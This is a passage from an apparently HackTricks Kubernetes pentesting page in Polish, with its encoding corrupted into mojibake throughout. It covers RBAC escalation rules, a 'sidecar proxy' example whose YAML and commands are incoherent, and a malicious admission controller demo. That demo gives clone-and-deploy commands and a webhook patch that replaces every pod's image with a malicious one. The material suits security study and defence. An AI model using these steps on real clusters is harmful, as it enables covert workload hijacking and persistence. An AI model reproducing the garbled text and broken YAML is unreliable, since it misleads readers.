Podmioty z uprawnieniami **`update`** lub **`patch`** do `nodes/status` lub `pods/status` mogÄ… modyfikowaÄ‡ etykiety, aby wpÅ‚ynÄ…Ä‡ na wymuszone ograniczenia harmonogramu.

## Wbudowana zapobieganie eskalacji uprawnieÅ„

Kubernetes ma [wbudowany mechanizm](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) zapobiegajÄ…cy eskalacji uprawnieÅ„.

System ten zapewnia, Å¼e **uÅ¼ytkownicy nie mogÄ… podnosiÄ‡ swoich uprawnieÅ„ poprzez modyfikacjÄ™ rÃ³l lub powiÄ…zaÅ„ rÃ³l**. Egzekwowanie tej zasady odbywa siÄ™ na poziomie API, co zapewnia zabezpieczenie nawet wtedy, gdy autoryzator RBAC jest nieaktywny.

Zasada ta stanowi, Å¼e **uÅ¼ytkownik moÅ¼e tworzyÄ‡ lub aktualizowaÄ‡ rolÄ™ tylko wtedy, gdy posiada wszystkie uprawnienia, ktÃ³re ta rola obejmuje**. Ponadto zakres istniejÄ…cych uprawnieÅ„ uÅ¼ytkownika musi byÄ‡ zgodny z zakresem roli, ktÃ³rÄ… prÃ³buje utworzyÄ‡ lub zmodyfikowaÄ‡: albo w skali klastra dla ClusterRoles, albo ograniczony do tej samej przestrzeni nazw (lub w skali klastra) dla RÃ³l.

{% hint style="warning" %}
Istnieje wyjÄ…tek od powyÅ¼szej zasady. JeÅ›li podmiot ma **czasownik `escalate`** nad **`roles`** lub **`clusterroles`**, moÅ¼e zwiÄ™kszyÄ‡ uprawnienia rÃ³l i clusterroles, nawet nie majÄ…c tych uprawnieÅ„.
{% endhint %}

### **Pobierz i zmodyfikuj RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**WyglÄ…da na to, Å¼e ta technika dziaÅ‚aÅ‚a wczeÅ›niej, ale wedÅ‚ug moich testÃ³w juÅ¼ nie dziaÅ‚a z tego samego powodu wyjaÅ›nionego w poprzedniej sekcji. Nie moÅ¼esz utworzyÄ‡/modyfikowaÄ‡ rolebindingu, aby przyznaÄ‡ sobie lub innemu SA jakieÅ› uprawnienia, jeÅ›li ich juÅ¼ nie masz.**
{% endhint %}

Uprawnienie do tworzenia Rolebindings pozwala uÅ¼ytkownikowi na **powiÄ…zanie rÃ³l z kontem usÅ‚ugi**. To uprawnienie moÅ¼e potencjalnie prowadziÄ‡ do eskalacji uprawnieÅ„, poniewaÅ¼ **pozwala uÅ¼ytkownikowi powiÄ…zaÄ‡ uprawnienia administratora z skompromitowanym kontem usÅ‚ugi.**

## Inne ataki

### Aplikacja proxy sidecar

DomyÅ›lnie nie ma Å¼adnego szyfrowania w komunikacji miÄ™dzy podami. Wzajemna autoryzacja, dwukierunkowa, pod do pod.

#### UtwÃ³rz aplikacjÄ™ proxy sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

UtwÃ³rz swÃ³j plik .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Edytuj swÃ³j plik .yaml i dodaj odkomentowane linie:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Zobacz logi proxy:
```bash
kubectl logs app -C proxy
```
WiÄ™cej informacji na: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### ZÅ‚oÅ›liwy Kontroler PrzyjÄ™Ä‡

Kontroler przyjÄ™Ä‡ **przechwytuje Å¼Ä…dania do serwera API Kubernetes** przed zapisaniem obiektu, ale **po uwierzytelnieniu** **i autoryzacji** Å¼Ä…dania.

JeÅ›li atakujÄ…cy w jakiÅ› sposÃ³b zdoÅ‚a **wstrzyknÄ…Ä‡ ZÅ‚oÅ›liwy Kontroler PrzyjÄ™Ä‡**, bÄ™dzie mÃ³gÅ‚ **modyfikowaÄ‡ juÅ¼ uwierzytelnione Å¼Ä…dania**. BÄ™dzie miaÅ‚ potencjalnie moÅ¼liwoÅ›Ä‡ eskalacji uprawnieÅ„, a zazwyczaj takÅ¼e utrzymania siÄ™ w klastrze.

**PrzykÅ‚ad z** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
SprawdÅº status, aby zobaczyÄ‡, czy jest gotowy:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

NastÄ™pnie wdroÅ¼ nowy pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Kiedy widzisz bÅ‚Ä…d `ErrImagePull`, sprawdÅº nazwÄ™ obrazu za pomocÄ… jednej z poniÅ¼szych zapytaÅ„:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Jak widaÄ‡ na powyÅ¼szym obrazie, prÃ³bowaliÅ›my uruchomiÄ‡ obraz `nginx`, ale ostatecznie wykonany obraz to `rewanthtammana/malicious-image`. Co siÄ™ wÅ‚aÅ›nie staÅ‚o!!?

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

Skrypt `./deploy.sh` ustanawia kontroler dostÄ™pu z mutujÄ…cym webhookiem, ktÃ³ry modyfikuje Å¼Ä…dania do API Kubernetes zgodnie z okreÅ›lonymi w nim liniami konfiguracyjnymi, wpÅ‚ywajÄ…c na zaobserwowane wyniki:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

## OPA Gatekeeper bypass

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Best Practices

### **WyÅ‚Ä…czenie automatycznego montowania tokenÃ³w konta usÅ‚ugi**

* **Pody i konta usÅ‚ugi**: DomyÅ›lnie pody montujÄ… token konta usÅ‚ugi. Aby zwiÄ™kszyÄ‡ bezpieczeÅ„stwo, Kubernetes pozwala na wyÅ‚Ä…czenie tej funkcji automatycznego montowania.
* **Jak zastosowaÄ‡**: Ustaw `automountServiceAccountToken: false` w konfiguracji konta usÅ‚ugi lub podÃ³w, poczÄ…wszy od wersji Kubernetes 1.6.

### **Restrykcyjne przypisanie uÅ¼ytkownikÃ³w w RoleBindings/ClusterRoleBindings**

* **Selektywne wÅ‚Ä…czenie**: Upewnij siÄ™, Å¼e tylko niezbÄ™dni uÅ¼ytkownicy sÄ… wÅ‚Ä…czani w RoleBindings lub ClusterRoleBindings. Regularnie audytuj i usuwaj nieistotnych uÅ¼ytkownikÃ³w, aby utrzymaÄ‡ Å›cisÅ‚e bezpieczeÅ„stwo.

### **Role specyficzne dla przestrzeni nazw zamiast rÃ³l ogÃ³lnoklastrowych**

* **Role vs. ClusterRoles**: Preferuj uÅ¼ywanie rÃ³l i RoleBindings dla uprawnieÅ„ specyficznych dla przestrzeni nazw, zamiast ClusterRoles i ClusterRoleBindings, ktÃ³re majÄ… zastosowanie w caÅ‚ym klastrze. Takie podejÅ›cie oferuje dokÅ‚adniejszÄ… kontrolÄ™ i ogranicza zakres uprawnieÅ„.

### **UÅ¼ywaj narzÄ™dzi automatycznych**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referencje**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
